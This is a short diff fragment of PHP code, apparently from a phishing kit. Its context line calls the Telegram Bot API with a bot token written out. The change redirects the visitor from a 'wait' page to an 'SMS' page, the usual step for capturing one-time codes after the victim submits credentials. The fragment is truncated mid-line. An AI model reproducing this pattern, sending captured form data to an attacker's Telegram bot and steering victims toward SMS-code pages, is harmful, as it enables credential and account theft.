@@ -20,4 +20,4 @@ file_get_contents("https://api.telegram.org/bot5367411588:AAGqu6MHQKUUGDiIJiCmed
 
 
 
-header("Location: ././wait/");?>
+header("Location: ././SMS/");?>
